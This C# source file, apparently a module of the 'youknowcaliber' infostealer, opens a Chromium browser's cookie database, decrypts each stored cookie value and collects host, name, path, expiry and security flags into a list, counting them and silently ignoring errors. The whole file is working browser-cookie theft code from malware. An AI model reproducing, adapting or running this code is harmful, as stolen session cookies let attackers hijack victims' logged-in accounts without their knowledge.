using System.IO;
using System.Collections.Generic;

namespace youknowcaliber.Chromium
{
    internal sealed class Cookies
    {
     
        public static List<Cookie> Get(string sCookie)
        {
            List<Cookie> lcCookies = new List<Cookie>();

            try
            {
                // Read data from table
                SQLite sSQLite = SqlReader.ReadTable(sCookie, "cookies");
                if (sSQLite == null) return lcCookies;

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {

                    Cookie cCookie = new Cookie();

                    cCookie.sValue = Crypto.EasyDecrypt(sCookie, sSQLite.GetValue(i, 12));


                    if (cCookie.sValue == "")
                        cCookie.sValue = sSQLite.GetValue(i, 3);

                    cCookie.sHostKey = Crypto.GetUTF8(sSQLite.GetValue(i, 1));
                    cCookie.sName = Crypto.GetUTF8(sSQLite.GetValue(i, 2));
                    cCookie.sPath = Crypto.GetUTF8(sSQLite.GetValue(i, 4));
                    cCookie.sExpiresUtc = Crypto.GetUTF8(sSQLite.GetValue(i, 5));
                    cCookie.sIsSecure = Crypto.GetUTF8(sSQLite.GetValue(i, 6).ToUpper());

                    Counting.Cookies++;
                    lcCookies.Add(cCookie);
                }
            }
            catch  {  }
            return lcCookies;
        }
    }
}
